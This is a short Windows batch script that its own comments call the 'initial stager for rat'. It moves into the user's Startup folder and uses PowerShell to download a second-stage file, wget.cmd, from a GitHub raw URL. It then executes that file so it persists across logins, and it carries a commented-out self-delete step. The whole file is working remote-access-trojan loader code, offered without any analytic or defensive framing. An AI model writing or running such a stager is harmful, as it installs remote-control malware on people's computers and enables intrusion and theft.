@echo off
@REM initial stager for rat

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup dir
cd %STARTUP%

@REM buil out stage two
@REM write payloads to startup

powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Dukk3D3nnis/resources/blob/main/wget.cmd -OutFile wget.cmd"

@REM run payload
powershell ./wget.cmd

@REM cd back into initial location
cd "%INITIALPATH%"

@REM self delete
@REM del initial.cmd
